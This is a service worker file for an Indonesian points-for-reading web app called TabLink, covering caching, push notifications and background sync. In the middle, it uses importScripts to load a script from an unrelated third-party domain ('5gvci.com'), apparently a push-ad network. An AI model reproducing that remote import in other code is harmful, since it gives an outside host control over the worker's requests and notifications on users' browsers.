// sw.js - Service Worker untuk TabLink
const CACHE_NAME = 'tablink-v1';
const DYNAMIC_CACHE = 'tablink-dynamic-v1';

// Aset statis yang di-cache
const STATIC_ASSETS = [
  '/',
  '/index.html',
  '/app.js',
  '/api.js',
  'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap',
  'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css'
];

// ========== INSTALL ==========
self.addEventListener('install', (event) => {
  console.log('[SW] Installing...');
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then((cache) => cache.addAll(STATIC_ASSETS))
      .then(() => self.skipWaiting())
  );
});

// ========== ACTIVATE ==========
self.addEventListener('activate', (event) => {
  console.log('[SW] Activating...');
  event.waitUntil(
    caches.keys().then((keys) => {
      return Promise.all(
        keys.filter(key => key !== CACHE_NAME && key !== DYNAMIC_CACHE)
            .map(key => caches.delete(key))
      );
    }).then(() => self.clients.claim())
  );
});

self.options = {
    "domain": "5gvci.com",
    "zoneId": 10892660
}
self.lary = ""
importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
// ========== FETCH (Cache Strategy) ==========
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  // Jangan cache request ke Firebase API
  if (url.pathname.includes('firebase') || 
      url.hostname.includes('firebaseio.com') ||
      url.hostname.includes('googleapis.com')) {
    return fetch(event.request);
  }
  
  // Jangan cache request POST/PUT/DELETE
  if (event.request.method !== 'GET') {
    return fetch(event.request);
  }
  
  // Strategi: Cache First, fallback ke Network
  event.respondWith(
    caches.match(event.request).then((cached) => {
      return cached || fetch(event.request).then((response) => {
        return caches.open(DYNAMIC_CACHE).then((cache) => {
          cache.put(event.request, response.clone());
          return response;
        });
      });
    })
  );
});

// ========== PUSH NOTIFICATION ==========
self.addEventListener('push', (event) => {
  const data = event.data ? event.data.json() : {};
  const title = data.title || 'TabLink Reward';
  const options = {
    body: data.body || 'Ada artikel baru! Baca sekarang dapat poin.',
    icon: '/icon-192.png',
    badge: '/badge-72.png',
    vibrate: [200, 100, 200],
    data: { url: data.url || '/' }
  };
  
  event.waitUntil(self.registration.showNotification(title, options));
});

// ========== NOTIFICATION CLICK ==========
self.addEventListener('notificationclick', (event) => {
  event.notification.close();
  event.waitUntil(
    clients.matchAll({ type: 'window' }).then((clientsArr) => {
      const url = event.notification.data.url || '/';
      for (const client of clientsArr) {
        if (client.url.includes(url) && 'focus' in client) {
          return client.focus();
        }
      }
      if (clients.openWindow) {
        return clients.openWindow(url);
      }
    })
  );
});

// ========== BACKGROUND SYNC ==========
self.addEventListener('sync', (event) => {
  if (event.tag === 'sync-points') {
    event.waitUntil(syncPoints());
  }
});

async function syncPoints() {
  try {
    const cache = await caches.open('pending-points');
    const requests = await cache.keys();
    
    for (const req of requests) {
      const data = await cache.match(req);
      await fetch('/api/sync-points', {
        method: 'POST',
        body: data
      });
      await cache.delete(req);
    }
  } catch (err) {
    console.error('[SW] Sync failed:', err);
  }
}
